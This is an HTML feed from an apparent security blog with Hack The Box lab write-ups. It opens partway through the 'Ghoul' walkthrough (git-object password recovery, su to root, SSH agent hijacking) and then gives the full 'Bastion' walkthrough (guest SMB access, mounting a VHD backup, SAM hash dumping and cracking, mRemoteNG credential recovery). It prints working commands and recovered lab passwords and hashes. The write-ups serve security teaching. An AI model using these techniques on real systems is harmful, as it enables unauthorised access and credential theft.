spring.servlet.multipart.enabled=true
spring.servlet.multipart.file-size-threshold=2KB
spring.servlet.multipart.max-file-size=200MB
spring.servlet.multipart.max-request-size=215MB&lt;/pre&gt;

&lt;p&gt;As first we can look at it using common git commands, as log, show,branch etc.. but those are rabbit holes. Indeed, looking at the git logs we can see that there  is a remote git repository !&lt;/p&gt;

&lt;pre&gt;logs/refs/heads/master:0000000000000000000000000000000000000000 8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062314 +0530    commit (initial): update readme
logs/refs/heads/master:8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 bec96aaf334dc0110caa163e308d4e2fc2b8f133 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062622 +0530    commit: updated dependencies
logs/refs/heads/master:bec96aaf334dc0110caa163e308d4e2fc2b8f133 51d2c360b13b37ad608361642bd86be2a4983789 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062722 +0530    commit: added readme
logs/refs/heads/master:51d2c360b13b37ad608361642bd86be2a4983789 ed5a88cbbc084cba1c0954076a8d7f6f5ce0d64b kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062881 +0530    commit: mysql support
logs/refs/heads/master:813e0a518064778343ba54b64e16ad44c19900fb b3752e00721b4b87c99ef58e3a54143061b20b99 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546063447 +0530    commit: noro stop doing stupid shit
logs/refs/heads/master:b3752e00721b4b87c99ef58e3a54143061b20b99 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546063698 +0530    commit: added service
logs/refs/heads/master:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064090 +0530    commit: update dependencies
logs/refs/heads/master:0d426b533d4f1877f8a114620be8a1294f34ab71 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064281 +0530    reset: moving to HEAD^
logs/refs/heads/master:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064622 +0530    reset: moving to 0d426b5
logs/refs/heads/master:0d426b533d4f1877f8a114620be8a1294f34ab71 b3752e00721b4b87c99ef58e3a54143061b20b99 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064718 +0530    reset: moving to b3752e0
logs/refs/heads/master:b3752e00721b4b87c99ef58e3a54143061b20b99 b43757dbbefdb3af3966fbd5ca273496180dc913 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064792 +0530    commit: added mysql deps
logs/refs/heads/master:b43757dbbefdb3af3966fbd5ca273496180dc913 647c5f1a2f95e117244d9128bff7a579ca1d4968 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546065100 +0530    commit: changed service
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:0000000000000000000000000000000000000000 98ecb8ad40e3d47029bfecd3e356d4b880d835e3 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062361 +0530   pull: storing head
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:98ecb8ad40e3d47029bfecd3e356d4b880d835e3 8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062429 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 bec96aaf334dc0110caa163e308d4e2fc2b8f133 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062643 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:bec96aaf334dc0110caa163e308d4e2fc2b8f133 51d2c360b13b37ad608361642bd86be2a4983789 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062735 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:51d2c360b13b37ad608361642bd86be2a4983789 ed5a88cbbc084cba1c0954076a8d7f6f5ce0d64b kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062891 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:813e0a518064778343ba54b64e16ad44c19900fb b3752e00721b4b87c99ef58e3a54143061b20b99 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546063465 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:b3752e00721b4b87c99ef58e3a54143061b20b99 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546063708 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064105 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:0d426b533d4f1877f8a114620be8a1294f34ab71 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064304 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064632 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:0d426b533d4f1877f8a114620be8a1294f34ab71 b43757dbbefdb3af3966fbd5ca273496180dc913 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064802 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:b43757dbbefdb3af3966fbd5ca273496180dc913 647c5f1a2f95e117244d9128bff7a579ca1d4968 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546065107 +0530   update by push&lt;/pre&gt;

&lt;p&gt;Looking at the configurations, this remote has been hosted by gogs , probably a while ago and we cannot access it anymore. The only hope is that some crucial information has been stored into git objects.
Git objects can be found under .git/objects folder and they are zlib files. Luckily for us, stackoverflow will help ! https://stackoverflow.com/questions/3178566/how-to-deflate-with-a-command-line-tool-to-extract-a-git-object&lt;/p&gt;

&lt;pre&gt;printf &quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&quot; | cat - .git/objects/c0/fb67ab3fda7909000da003f4b2ce50a53f43e7 | gunzip â†’ this works!&lt;/pre&gt;

&lt;p&gt;So start trying all the the git objects one by one, taking note for eventual new password appearing, suddenly I got somethingâ€¦&lt;/p&gt;

&lt;pre&gt;
    /.git/objects/41# printf &quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&quot; | cat - * | gunzip | strings

gzip: stdin: unexpected end of file
blob 476
server.port=8080
spring.datasource.url=jdbc:mysql://localhost:3306/db
spring.datasource.username=root
spring.datasource.password=g_xEN$ZuWD7hJf2G
&lt;/pre&gt;

&lt;p&gt;Tried the new password everywhereâ€¦ Nein!&lt;/p&gt;

&lt;pre&gt;gzip: stdin: unexpected end of file
blob 478
server.port=8080
spring.datasource.url=jdbc:mysql://localhost:3306/db
spring.datasource.username=kaneki
spring.datasource.password=7^Grc%C\7xEQ?tb4
server.address=0.0.0.0&lt;/pre&gt;

&lt;p&gt;And the new passwordâ€¦ works! We are able to become root on 172.20.0.150&lt;/p&gt;

&lt;pre&gt;su : pasword 7^Grc%C\7xEQ?tb4&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/Ghoul/kaneki_13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;â€¦
Ok so we are root on the 172.18.0.200, the only host that is still untouched is the docker server on 172.20.0.1. Maybe on the filesystem there are some info for connect to it.
Run enumeration, nothing.
Lets try conjobs, just run pspy64 and wait a while.
And finally something weird happened:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/Ghoul/pspy_14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems that some other host is passing through this host to reach 172.18.0.1 for a root session on itâ€¦interesting
After a bit of googling I got my answer:&lt;/p&gt;

&lt;p&gt;https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking/&lt;/p&gt;

&lt;p&gt;So I can Hijack the SSH session. I just need to be fast.&lt;/p&gt;

&lt;pre&gt;SSH_AUTH_SOCK=/tmp/ssh-e6wtZlMHTY/agent.1061 ssh root@172.18.0.1 -p 2222&lt;/pre&gt;

&lt;p&gt;finally rootâ€¦
&lt;img src=&quot;//assets/images/Ghoul/root_15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;who-ate-the-ghoul--thank-you-for-reading-this-write-up-feedback-is-appreciated-happy-hacking-&quot;&gt;Who ate the Ghoul ? Thank you for reading this write-up. Feedback is appreciated! Happy hacking :)&lt;/h4&gt;</content><author><name>Entrophy</name></author><category term="HTB" /><summary type="html">USER</summary></entry><entry><title type="html">Bastion</title><link href="/htb/bastion/" rel="alternate" type="text/html" title="Bastion" /><published>2019-09-13T00:00:00+01:00</published><updated>2019-09-13T00:00:00+01:00</updated><id>/htb/bastion</id><content type="html" xml:base="/htb/bastion/">&lt;h1 id=&quot;user&quot;&gt;USER&lt;/h1&gt;

&lt;p&gt;The first thing we have done has been to perform an &lt;strong&gt;Nmap&lt;/strong&gt; scan against the target.&lt;/p&gt;

&lt;pre&gt;nmap -sS -sV -v -A -p- -oA nmap_tcp_all 10.10.10.134

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
| 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
| 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open msrpc Microsoft Windows RPC
49665/tcp open msrpc Microsoft Windows RPC
49666/tcp open msrpc Microsoft Windows RPC
49667/tcp open msrpc Microsoft Windows RPC
49668/tcp open msrpc Microsoft Windows RPC
49669/tcp open msrpc Microsoft Windows RPC
49670/tcp open msrpc Microsoft Windows RPC

&lt;/pre&gt;

&lt;p&gt;As it is possible to notice the only interesting ports are SMB ports. For this reason we
tried to use smbmap with guest account, through the following command :&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbmap -H 10.10.10.134 -u guest -p &quot;&quot; -R&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/bastion/initial_smb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As it is possible to observe the result is quite interesting because we can freely access to
the Backup folder of the SMB server.
Trying to download large files has revealed to be slow so we tried so we tried to mount
the smb share on our box, using the following command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mount //10.10.10.134/Backups ./vhd/ -o user=guest&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Unfortunately the command does not work properly, apparently the File System is CIFS and mount
need a further module, cifs-utils.
After having installed the module, we could access the SMB share running:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mount //10.10.10.134/Backups ./vhd/ -o user=guest&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Enumerating the share locally, we can notice a WindowsImageBackup folder, which could potentially
contain some interesting backup files. Reaching the following folder WindowsImageBackup/L4mpje-
PC/Backup 2019-02-22 124351 is possible to notice some xml and Windows Disk Image files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/bastion/tree_smbshare.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first try is to mount that image file. We need to find a tool which allows us to mount vhd image
files, because Kali doesnâ€™t support it natively.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo apt-get install libvhdi-utils sleuthkit
vhdimount 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
/root/Documents/HTB/Bastion/smb/vhd_mount/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;In this way we create a device vhd1 in the selected folder, creating a Boot-Sector for mounitng the
Windows Image Disk. At this step , simply trying to mount the device returns an error, declaring that
NTFS signature is missing.
Analysing the vhdi1 using mmls shows that the NFS partition does not start from the beginning of the
file, but from 0000000128.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/bastion/mmls.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using this information is possible to calculate the offset, which is 128*512 (sector length) = 65536.
Rewriting the commands brings to:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mount -vt ntfs-3g -o ro,noload,offset=65536 /.vhdi1 ./backup/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And we were able to mount the partition in the backup folder. Looking at the backup, it is clear that it
contains the whole Windows OS, including the configuration files. Indeed, it is possible to access to the
folder /Windows/System32/config and have access to SYSTEM and SAM files, which are needed in
order to dump the hashes of the users.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/bastion/hashdump.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using john specifying the NT format is possible to crack the password of user L4mpje.
Administrator::500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:&lt;strong&gt;bureaulampje&lt;/strong&gt;:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec9
86d9:::
Using the discovered credential over ssh allows to open a session as user L4mpje, obtaining the first
flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/bastion/user.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;root&quot;&gt;ROOT&lt;/h1&gt;

&lt;p&gt;Now we need to get superuser privileges. As first, we need to enumerate the Windows FS, searching for
interesting files. Unofrtunately the systeminfo command is denied, so I tried to access the same
information using powershell, verifying if I obtain a different result. And so it was, we were able to
identify the current OS version using Get-ComputerInfo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/bastion/windowsos.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In order to have a complete overview of the files and programs installed on the comuter, I also run the
Powerless [1] enumeration script. The output is present as Appendix.
Digging into the listed files, we noticed a non-standard application installed under Program Files (x86)&lt;br /&gt;
mRemoteNG.
Googling it we discovered that it is a manager for remote connections for different communications
protocols [2]. So it could likely contains usefull credentials, hopefully of the Administrator user,
granting us full control over the box. Further researching for possible ways to recovery the password, I
found an interesting article [3]. Despite it proposes three different ways in order to recover it, the only
one actually working for me is the first one, which involves installing mRemoteNG in a Windows
system.
The file which contains the credential we are searching for is under Users\L4mpje\AppData\Roaming&lt;br /&gt;
mRemoteNG\confCons.xml which contains two nodes, so probably, two encrypted credentials.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/bastion/nodes.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After having started a Windows VM and having installed mRemoteNG on it, I modified the
confCons.xml file in order to set a blank password for opening the file and loaded it using mRemoteNG
on my VM. The file is successfully loaded and the program shows two connectins : DC and L4mpje.
Using the password lookup tool of mRemoteNg, we are able to check the credentials of both user,
finding a new password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/bastion/Capture.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Providing this as password for user Administrator over ssh opens up an ssh session, so are have finally
owned the box. We can take the last flag and say bye bye to Bastion :P&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/bastion/root.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;

&lt;p&gt;[1] : https://github.com/M4ximuss/Powerless&lt;/p&gt;

&lt;p&gt;[2] : https://mremoteng.org&lt;/p&gt;

&lt;p&gt;[3] : http://hackersvanguard.com/mremoteng-insecure-password-storage/&lt;/p&gt;</content><author><name>Entrophy</name></author><category term="HTB" /><summary type="html">USER</summary></entry></feed>